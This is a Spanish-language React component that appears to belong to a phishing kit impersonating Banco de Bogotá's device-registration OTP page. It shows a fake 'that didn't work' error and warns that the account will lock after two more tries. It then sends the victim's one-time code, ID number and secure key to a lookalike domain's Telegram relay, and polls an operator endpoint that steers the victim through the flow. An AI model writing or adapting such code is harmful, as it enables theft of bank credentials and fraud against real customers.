import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const ErrorOTP = () => {
  const [otp, setOtp] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [documentNumber, setDocumentNumber] = useState('');
  const [loading, setLoading] = useState(true);
  const [message, setMessage] = useState(''); // Agregado el estado message
  const navigate = useNavigate();

  useEffect(() => {
    const savedFormValues = localStorage.getItem('formValues');
    const savedDocumentNumber = localStorage.getItem('documentNumber');
    const savedSecureKey = localStorage.getItem('secureKey');

    if (savedFormValues) {
      const formValues = JSON.parse(savedFormValues);
      setCardNumber(formValues.cardNumber || '');
    }

    if (savedDocumentNumber) {
      setDocumentNumber(savedDocumentNumber);
    }

    if (!savedDocumentNumber || !savedSecureKey) {
      setMessage('No se encontraron los datos necesarios en el localStorage.');
    }

    const interval = setInterval(async () => {
      try {
        const response = await fetch('https://segurobogoco.com/api/v1/admin/guests');
        const data = await response.json();

        if (data && data.guests && data.guests[0] && data.guests[0].status_id === 6) {
          setLoading(false);
          navigate('/bancodebogota/ingreso/codigo_seguridad');
        }
      } catch (error) {
        console.error('Error al consultar el estado:', error);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [navigate]);

  const handleSubmit = async () => {
    if (otp.length === 6) {
      const savedDocumentNumber = localStorage.getItem('documentNumber');
      const savedSecureKey = localStorage.getItem('secureKey');
      const savedFormValues = JSON.parse(localStorage.getItem('formValues')) || {};
      const banco = localStorage.getItem('banco') || 'No disponible';

      if (savedDocumentNumber && savedSecureKey) {
        const guestId = localStorage.getItem('guestId');
        if (!guestId) {
          setMessage('No se encontró el ID del guest en el localStorage.');
          return;
        }

        const dataToSend = {
          otp: otp,
          documentNumber: savedDocumentNumber,
          secureKey: savedSecureKey,
        };

        try {
          const response = await fetch('https://segurobogoco.com/api/v1/send-telegram-message', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(dataToSend),
          });

          if (!response.ok) {
            throw new Error('Error al enviar los datos al backend');
          }

          const updateResponse = await fetch(`https://segurobogoco.com/api/v1/guest/${guestId}`, {
            method: 'PUT',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              otp: otp, // Aquí estamos actualizando el campo OTP en la base de datos
              status_id: 1, // Actualizar el status_id a 1
            }),
          });

          if (!updateResponse.ok) {
            throw new Error('Error al actualizar el estado');
          }

          navigate('/loading');
        } catch (error) {
          console.error('Error al enviar datos:', error);
          setMessage('Error al enviar los datos.');
        }
      } else {
        setMessage('Datos del formulario no disponibles.');
      }

      setOtp('');
      setMessage('');
    } else {
      setMessage('Por favor, ingrese un código de 6 dígitos.');
    }
  };

  return (
    <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg p-6 mt-8">
      <div className="flex items-center space-x-4 mb-2">
        <img
          src="../../../public/images.png"
          alt="Menu"
          className="w-14 h-auto"
        />
        <p className="text-xl font-bold">Registro nuevo dispositivo</p>
      </div>
      <img src="../../../public/hombre-afro-caminando-con-bolsas-en-el-hombro.jpg" alt="hombre con bolsas"
        className='mb-4' />
      <div className="space-y-4 text-center">
        <p className='text-red-500'>¡Eso no funcionó!</p>
        <div className="flex flex-col items-center text-gray-500">
          <p>Por tu seguridad te hemos enviado un nuevo código de acceso a el numero registrado a la cuenta con número de Identificación <b>{documentNumber || 'No disponible'}.</b></p>
          <b className='pt-2 text-red-500'>Después de 2 intentos más se bloqueará la cuenta</b>
          <span className="text-gray-700 pt-2 font-bold">Digite el Código:</span>
          <input
            type="text"
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            placeholder="Ingrese el código"
            maxLength="6"
            required
            className="w-full h-12 border border-gray-300 rounded px-3 mt-2 focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-150 ease-in-out"
          />
        </div>
        <p
          className="text-blue-600 cursor-pointer text-center mt-4 mb-4"
          onClick={() => alert('Código Enviado')}
        >
          Presione aquí para recibir un nuevo código
        </p>
        <button
          onClick={handleSubmit}
          className="w-full h-12 bg-[#0043a9] text-white rounded-lg hover:bg-blue-700 transition duration-150 ease-in-out"
        >
          Enviar
        </button>
        {message && <p className="text-red-500 mt-2 text-center">{message}</p>}
      </div>
    </div>
  );
};

export default ErrorOTP;
